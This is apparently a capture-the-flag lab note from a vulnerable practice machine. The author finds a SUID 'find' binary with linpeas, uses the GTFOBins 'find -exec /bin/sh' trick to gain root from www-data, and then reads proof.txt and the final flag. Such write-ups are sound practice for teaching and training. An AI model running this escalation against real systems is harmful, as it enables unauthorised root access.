**Copied from linpeas\--  full**

**10\) SUID: \-rwsr\-xr\-x 1 root root 159K Jan  6  2012 /usr/bin/find
\-rwsr\-xr\-x 1 root root 9\.5K Jun 20  2017 /usr/lib/pt\_chown  \-\-\-\>  GNU\_glibc\_2\.1/2\.1\.1\_\-6\(08\-1999\)

Stopping here to check gtfobins and try this, haven't seen it:
****
find \. \-exec /bin/sh \-p \\; \-quit****
**
**Tried this, failed:
**
find \. \-exec /bin/sh \\; \-quit
/bin/sh: 0: Illegal option \-p
/bin/sh: 0: Illegal option \-p
/bin/sh: 0: Illegal option \-p
id
uid=33\(www\-data\) gid=33\(www\-data\) groups=33\(www\-data\)

**Tried without \-p, OH SHIT:

**find \. \-exec /bin/sh \\; \-quit

id
uid=33\(www\-data\) gid=33\(www\-data\) euid=0\(root\) groups=0\(root\),33\(www\-data\)

**Looks like I am group root now, wowsers\.\. 

**ls /root
proof\.txt
thefinalflag\.txt
ls /root \-lsaF
total 36
4 drwx\-\-\-\-\-\-  4 root root 4096 Apr 11 03:33 \./
4 drwxr\-xr\-x 23 root root 4096 Feb 19  2019 \.\./
4 drwx\-\-\-\-\-\-  2 root root 4096 Mar 29 22:56 \.aptitude/
4 \-rw\-\-\-\-\-\-\-  1 root root    6 Mar 30 00:31 \.bash\_history
4 \-rw\-r\-\-r\-\-  1 root root  949 Feb 19  2019 \.bashrc
4 drwxr\-xr\-x  3 root root 4096 Feb 19  2019 \.drush/
4 \-rw\-r\-\-r\-\-  1 root root  140 Nov 20  2007 \.profile
4 \-rw\-r\-\-r\-\-  1 root root   33 Apr 11 03:33 proof\.txt
4 \-rw\-r\-\-r\-\-  1 root root  173 Feb 19  2019 thefinalflag\.txt
cat /root/proof\.txt
66877b1efa7e72bad25c67adaf8f2e03
cat /root/thefinalflag\.txt
Well done\!\!\!\!

Hopefully you've enjoyed this and learned some new skills\.

You can let me know what you thought of this little journey
by contacting me via Twitter \- @DCAU7


